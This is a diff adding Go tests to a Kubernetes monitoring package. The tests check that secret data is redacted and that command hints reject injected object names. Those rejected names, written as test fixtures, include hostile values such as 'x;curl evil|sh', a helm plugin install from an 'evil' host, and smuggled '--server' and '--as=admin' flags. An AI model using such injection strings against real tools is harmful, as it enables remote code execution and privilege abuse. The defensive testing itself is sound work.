@@ -1,6 +1,7 @@
 package monitor
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 	"time"
@@ -103,5 +104,52 @@ func TestApplyScopesClustersAndNamespaces(t *testing.T) {
 	}
 	if !inScope(nil, "x") || inScope([]string{"a"}, "b") || !inScope([]string{"a", "b"}, "b") {
 		t.Fatal("inScope")
+	}
+}
+
+func TestGenericPathCannotReachCoreSecrets(t *testing.T) {
+	for _, k := range []string{"cr:/secrets", "cr:/configmaps", "cr:/pods"} {
+		if _, ok := genericFor(k); ok {
+			t.Errorf("%s must not resolve through the generic path", k)
+		}
+	}
+	if _, ok := genericFor("cr:cert-manager.io/certificates"); !ok {
+		t.Error("custom resources must still resolve")
+	}
+	obj := map[string]any{
+		"kind":       "Secret",
+		"data":       map[string]any{"password": "aHVudGVyMg=="},
+		"stringData": map[string]any{"token": "abc"},
+		"metadata": map[string]any{"name": "s", "managedFields": []any{1}, "annotations": map[string]any{
+			"kubectl.kubernetes.io/last-applied-configuration": `{"stringData":{"token":"abc"}}`, "keep": "me"}},
+	}
+	redactObject(obj)
+	b, _ := json.Marshal(obj)
+	for _, leak := range []string{"aHVudGVyMg", "abc", "last-applied", "managedFields"} {
+		if strings.Contains(string(b), leak) {
+			t.Errorf("redacted object still contains %q: %s", leak, b)
+		}
+	}
+	if !strings.Contains(string(b), `"password":"\u003chidden by k8s-buddy\u003e"`) || !strings.Contains(string(b), `"keep":"me"`) {
+		t.Errorf("keys and other annotations should survive: %s", b)
+	}
+}
+
+func TestEventHintRejectsInjectedNames(t *testing.T) {
+	bad := []corev1.ObjectReference{
+		{Kind: "Pod", Namespace: "ns", Name: "x --server=https://evil --insecure-skip-tls-verify"},
+		{Kind: "Pod", Namespace: "ns", Name: "x;curl evil|sh"},
+		{Kind: "Pod", Namespace: "ns", Name: "x\nhelm plugin install https://evil"},
+		{Kind: "Pod --as=admin", Namespace: "ns", Name: "x"},
+		{Kind: "Pod", Namespace: "-n=kube-system", Name: "x"},
+	}
+	for _, o := range bad {
+		if h := eventHint("c", o, strings.ToLower(o.Kind)+"/"+o.Name); h != "" {
+			t.Errorf("%+v produced hint %q", o, h)
+		}
+	}
+	good := corev1.ObjectReference{Kind: "Pod", Namespace: "ns", Name: "web-0.x"}
+	if h := eventHint("c", good, "pod/web-0.x"); h != "kubectl --context c -n ns describe pod/web-0.x" {
+		t.Errorf("good name: %q", h)
 	}
 }
